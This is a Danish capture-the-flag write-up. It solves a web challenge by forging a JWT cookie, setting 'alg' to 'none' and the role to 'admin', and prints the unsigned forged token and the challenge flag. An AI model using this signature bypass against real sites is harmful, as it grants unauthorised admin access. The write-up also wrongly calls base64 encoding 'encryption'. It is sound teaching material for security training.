# None of your business

## Opgaven
> På dit nye skrivebord finder du en støvet seddel, hvor der står: "inc.hkn Opdater venligst JWT-biblioteket! Det haster meget! Kan omgå sikkerhed til admin!". Nu er du nysgerrig: Hvad skete der her?

## Løsning
Vi starter med at se på hjemmesiden, der er med til opgaven. 

![img.png](../assets/web_noyb_1.png)


> **Om JWT**
> 
> `JWT` er en forkortelse for "JSON Web Tokens" og er et bibliotek til brugerautentifikation baseret på en cookie. Værdien i cookien består af 3 dele, som er base64-krypteret og adskilt med ".":
> 1. Header
> 2. Payload (data)
> 3. Signature
> 
> I **Headeren** står blandt andet, hvilken algoritme, der er brugt samt, at det er en `JWT` cookie.
>
> I **Payload** kan der stå hvad som helt, som hjemmesiden måtte have brug for. Her står der en rolle, som vi gerne vil have ændret til "admin".
>
> **Signaturen** tager header, payload og en secret og danner derefter en signatur, som serveren kan verificere og dermed bekræfte ikke er ændret.

Der er i opgavebeskrivelsen et hint til `JWT`, og der findes da også en cookie ved navn `jwt` med følgende værdi: 

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidmlzaXRvciJ9.NYurrr01ZVp9TFD5Pvi5fNsj3Vrdw_yO9mWggE0dXMw
```

Hvis man kopierer værdien ind på [jwt.io](https://jwt.io), får man følgende udlæsning af værdien: 

![img.png](../assets/web_noyb_jwt.png)

Det bemærkes her, at vi har rollen "visitor".

Fra opgavebeskrivelsen kunne der godt ligge et hint til, at der er en kendt sårbarhed i `JWT`, som vi måske kan undersøge.

Det viser sig, at man kan sætte "alg" til "none" i stedet for en reel algoritme. Det kan vi udnytte til at bryde systemet. 

Hvis vi ændrer på de dele, vi gerne vil have ændret, kan vi prøve at sætte signaturen til ikke at bruge nogen algoritme og dermed måske lade os sende det nye payload uden at serveren fejler. 

```json
{
  "typ": "JWT",
  "alg": "none"
}
```

```json
{
  "role": "admin"
}
```

Disse dele base64-krypterer vi nu og får en ny cookie, hvori hver del sættes sammen med et punktum: 

```
ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0.ewogICJyb2xlIjogImFkbWluIgp9.

```

Bemærk her, at den tredje del efterlades "tom", men at der stadig er et afsluttende "." for at indikere, at den er tom. 

Vi erstatter vores cookie på hjemmesiden og reloader siden.

![img.png](../assets/web_noyb_admin.png)

Vi har nu adgang til "admin"-siden, som giver og flaget: 

```
DDC{uPdatEE_NeeDeD_urgenttliy}
```

